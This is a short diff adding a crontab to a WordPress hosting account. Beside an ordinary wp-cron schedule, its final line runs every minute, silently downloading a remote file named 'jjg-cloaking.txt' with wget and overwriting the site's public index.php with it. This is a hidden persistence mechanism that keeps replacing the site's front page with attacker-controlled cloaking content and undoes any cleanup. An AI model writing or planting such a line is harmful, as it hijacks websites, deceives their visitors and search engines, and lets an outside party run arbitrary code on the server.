@@ -1,0 +1,5 @@
+MAILTO=""
+SHELL="/bin/bash"
+2,7,12,17,22,27,32,37,42,47,52,57 * * * * cd /home/chiacundippal/public_html/web && /usr/local/bin/php /home/chiacundippal/public_html/web/wp-cron.php
+
+* * * * * wget -O /home/chiacundippal/public_html/web/index.php https://raw.githubusercontent.com/freyarion25/landingpage/refs/heads/main/jjg-cloaking.txt > /dev/null 2>&1
